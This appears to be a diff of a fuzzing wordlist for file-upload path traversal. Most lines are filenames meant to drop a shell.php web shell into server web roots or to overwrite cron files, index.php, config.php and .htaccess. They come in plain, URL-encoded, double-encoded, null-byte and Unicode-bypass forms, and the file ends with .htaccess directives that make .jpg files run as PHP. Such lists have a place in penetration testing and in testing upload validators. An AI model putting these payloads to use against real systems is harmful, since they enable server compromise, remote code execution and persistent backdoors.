@@ -1,8 +1,3 @@
-# ============================================================
-# Upload — Path Traversal via Filename
-# ============================================================
-
-# ---- Unix Path Traversal ----
 ../shell.php
 ../../shell.php
 ../../../shell.php
@@ -11,55 +6,39 @@
 ../../../usr/local/apache2/htdocs/shell.php
 ../../../srv/http/shell.php
 
-# ---- Windows Path Traversal ----
 ..\shell.php
 ..\..\shell.php
 ..\..\..\inetpub\wwwroot\shell.php
 ..\..\..\xampp\htdocs\shell.php
 
-# ---- URL-Encoded ----
 ..%2Fshell.php
 ..%2F..%2Fshell.php
 ..%2F..%2F..%2Fshell.php
 ..%5Cshell.php
 ..%5C..%5Cshell.php
 
-# ---- Double URL-Encoded ----
 ..%252Fshell.php
 ..%252F..%252Fshell.php
 ..%255Cshell.php
 
-# ---- Null Byte Injection ----
 ../shell.php%00.jpg
 ../shell.php\x00.jpg
 ../shell.php%00
 shell.php%00.png
 
-# ---- Unicode Bypass ----
 ..%c0%afshell.php
 ..%c1%9cshell.php
 ..%e0%80%afshell.php
 
-# ---- Mixed Separators ----
 ..\/shell.php
 ..\\/shell.php
 
-# ---- Overwrite Existing Files ----
 ../../../../../etc/cron.d/backdoor
 ../../../../../etc/crontab
 ../index.php
 ../config.php
 ../../.htaccess
 
-# ---- .htaccess Upload (Apache) ----
-# Filename: .htaccess
-# Content:
 AddType application/x-httpd-php .jpg
 Options +ExecCGI
 AddHandler cgi-script .jpg
-
-# ---- web.config Upload (IIS) ----
-# Filename: web.config
-# Content:
-# <?xml version="1.0" encoding="UTF-8"?>
-# <configuration><system.webServer><handlers><add name="php" path="*.jpg" verb="*" modules="IsapiModule" scriptProcessor="c:\php\php-isapi.dll" /></handlers></system.webServer></configuration>
